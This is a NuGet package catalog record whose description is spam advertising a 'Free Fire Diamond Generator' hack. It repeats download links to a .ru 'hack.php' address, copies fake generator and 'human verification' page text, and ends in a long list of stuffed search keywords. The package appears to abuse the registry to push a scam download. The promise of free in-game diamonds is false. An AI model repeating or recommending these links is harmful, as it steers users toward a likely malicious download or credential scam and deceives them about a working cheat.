{
  "@id": "https://api.nuget.org/v3/catalog0/data/2022.01.26.17.18.38/_free-fire-diamond-generator-working-2022-version-quc.6.8.60.json",
  "@type": [
    "PackageDetails",
    "catalog:Permalink"
  ],
  "authors": "SharpCrafters s.r.o.",
  "catalog:commitId": "570231b3-f71e-4bab-abcb-dc59904f7a57",
  "catalog:commitTimeStamp": "2022-01-26T17:18:38.6446003Z",
  "created": "2022-01-26T11:18:41.52Z",
  "description": "# _Free Fire Diamond Generator Working 2022 Version quc\n\n\nCLICK HERE TO DOWNLOAD  gt;gt;gt;gt;gt; [http://8.bltadwin.ru/hack.php](http://8.bltadwin.ru/hack.php)\n\n\nClick Here to Continue to Garena Free Fire Hack. Free Fire Diamond Hack Generator free fire diamond hack free fire hack diamond free fire diamond hack com Free Fire is the ultimate survival shooter game. Garena freefire hack diamond generator Free Fire Max app is one of the best online games. Install this plugin on desktop chrome browser or visit the.\n\n## [CLICK HERE TO DOWNLOAD  gt;gt;gt;gt;gt; http://8.bltadwin.ru/hack.php](http://8.bltadwin.ru/hack.php)\n\nFree Fire Resources generator. Generate FREE Resources for Free Fire on ANY Device. Account Details. Please enter your username and choose your device. Username: Device: Proceed. Secure Connection. Please choose one of our proxy servers from the options below. Diamonds: Proceed. Message. Human Verification. Free Fire Diamonds Online Generator New ONLINE GENERATOR. Status. ONLINE. Last Update. NOV 22 USER ONLINE. Your Username And Platform Continue Recent Activity vDiamondsavDiamondsa. 1, Diamonds. generation. Verification. Free Fire Generator Use our latest #1 free fire diamonds generator tool to get instant diamonds into your account. FFRewards - Generate Free Fire Diamonds Please note that you can only use this generator once every 24 hours so .\n\nfree fire diamond generator apk, free fire diamond generator 2022, free fire diamond generator no human verification ml, free fire diamond generator without human verification 2021, free fire diamond generator tool 2021, free fire diamond generator without human verification 2020, free fire diamond generator tool apk, free fire diamond generator without human verification 2021 india server, free fire diamond generator apps, free fire diamond generator anti ban, free fire diamond generator apk zen, free fire diamond generator apk mod, free fire diamonds and coin generator, free fire diamond generator apkpure, free fire diamond and generator, free fire diamond generator tool, free fire diamond generator india, free fire diamond generator by offer queen, free fire diamond generator by id, free fire diamond generator by garena, free fire diamond generator best, free fire diamond generator no ban, free fire diamond hack generator no ban, free fire diamond hack generator no ban app, free fire battleground diamond generator, free fire diamond generator code, free fire diamonds and coins generator, free fire diamond generator cool, free fire diamond hack.com generator, free fire diamond hack club generator, free fire diamond generator gamex.codes, free fire diamond generator new cheats, free fire diamond generator redeem code, free fire diamond generator download apk, free fire diamond generator diamonds and coins hack, free fire diamond hack generator apk download, free fire diamond hack generator app download, free fire diamond generator diamond, free fire diamond generator unlimited diamonds and coins 2020, does free fire diamond generator work, free fire diamond diamond generator tool, free fire diamond generator easy, is it possible to get free diamonds in free fire, can you get free diamonds in free fire, free fire diamond generator free me, free fire diamond generator for android, free fire diamond generator game codes, free fire diamond generator gamethunks.net, free fire diamond generator gehack, free fire diamond generator game, free fire diamond generator go hack, free fire diamond hack generator github, garena free fire diamond generator apk, free fire diamond hack generator go hack, generator diamond online free fire g hack, free fire diamond generator hack, free fire diamond generator hack tool, free fire diamond generator hack apk, free fire diamond generator instructions, free fire diamond history, free fire codes for diamonds, free fire diamond generator indonesia, free fire diamond generator introduction, free fire diamond generator in 2",
  "id": "_Free-Fire-Diamond-Generator-Working-2022-Version-quc",
  "isPrerelease": false,
  "language": "en-US",
  "lastEdited": "2022-01-26T17:18:07.593Z",
  "listed": false,
  "packageHash": "+fXF9POo6WLbab0wDrC+MS4pPNDAyMPIgt1DB9Zzh5aQvV4BW5LpPKLjkJEE2wpN+krhK2k8aPm8Sl0cnNb84g==",
  "packageHashAlgorithm": "SHA512",
  "packageSize": 11398,
  "published": "1900-01-01T00:00:00Z",
  "requireLicenseAcceptance": false,
  "title": "_Free-Fire-Diamond-Generator-Working-2022-Version-quc",
  "verbatimVersion": "6.8.60",
  "version": "6.8.60",
  "packageEntries": [
    {
      "@id": "https://api.nuget.org/v3/catalog0/data/2022.01.26.17.18.38/_free-fire-diamond-generator-working-2022-version-quc.6.8.60.json#xkcbnbnfxq.nuspec",
      "@type": "PackageEntry",
      "compressedLength": 1267,
      "fullName": "xkcbnbnfxq.nuspec",
      "length": 4475,
      "name": "xkcbnbnfxq.nuspec"
    },
    {
      "@id": "https://api.nuget.org/v3/catalog0/data/2022.01.26.17.18.38/_free-fire-diamond-generator-working-2022-version-quc.6.8.60.json#.signature.p7s",
      "@type": "PackageEntry",
      "compressedLength": 9471,
      "fullName": ".signature.p7s",
      "length": 9471,
      "name": ".signature.p7s"
    }
  ],
  "@context": {
    "@vocab": "http://schema.nuget.org/schema#",
    "catalog": "http://schema.nuget.org/catalog#",
    "xsd": "http://www.w3.org/2001/XMLSchema#",
    "dependencies": {
      "@id": "dependency",
      "@container": "@set"
    },
    "dependencyGroups": {
      "@id": "dependencyGroup",
      "@container": "@set"
    },
    "packageEntries": {
      "@id": "packageEntry",
      "@container": "@set"
    },
    "packageTypes": {
      "@id": "packageType",
      "@container": "@set"
    },
    "supportedFrameworks": {
      "@id": "supportedFramework",
      "@container": "@set"
    },
    "tags": {
      "@id": "tag",
      "@container": "@set"
    },
    "vulnerabilities": {
      "@id": "vulnerability",
      "@container": "@set"
    },
    "published": {
      "@type": "xsd:dateTime"
    },
    "created": {
      "@type": "xsd:dateTime"
    },
    "lastEdited": {
      "@type": "xsd:dateTime"
    },
    "catalog:commitTimeStamp": {
      "@type": "xsd:dateTime"
    },
    "reasons": {
      "@container": "@set"
    }
  }
}